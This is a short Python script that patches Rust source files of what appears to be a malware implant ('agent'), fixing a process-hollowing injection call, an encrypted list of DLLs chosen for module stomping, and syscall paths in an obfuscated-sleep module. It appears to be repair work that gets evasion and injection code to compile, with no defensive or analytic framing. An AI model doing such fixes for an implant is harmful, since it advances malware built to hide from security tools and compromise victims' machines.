import re

with open("agent/src/process_manager.rs", "r") as f:
    text = f.read()

text = text.replace("let result = hollowing::inject_into_process(process, &payload);", 
                    "let result = hollowing::inject_into_process(pid, &payload);")

with open("agent/src/process_manager.rs", "w") as f:
    f.write(text)

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

text = text.replace('''            let candidates = [
                enc_str!("msfte.dll"),
                enc_str!("msratelc.dll"),
                enc_str!("scrobj.dll"),
                enc_str!("amstream.dll")
            ];''', '''            let dll1 = enc_str!("msfte.dll");
            let dll2 = enc_str!("msratelc.dll");
            let dll3 = enc_str!("scrobj.dll");
            let dll4 = enc_str!("amstream.dll");
            
            let candidates: Vec<&[u8]> = vec![
                dll1.as_ref(),
                dll2.as_ref(),
                dll3.as_ref(),
                dll4.as_ref()
            ];''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

with open("agent/src/obfuscated_sleep.rs", "r") as f:
    text = f.read()

text = text.replace("syscalls::syscall_", "crate::syscalls::syscall_")

with open("agent/src/obfuscated_sleep.rs", "w") as f:
    f.write(text)
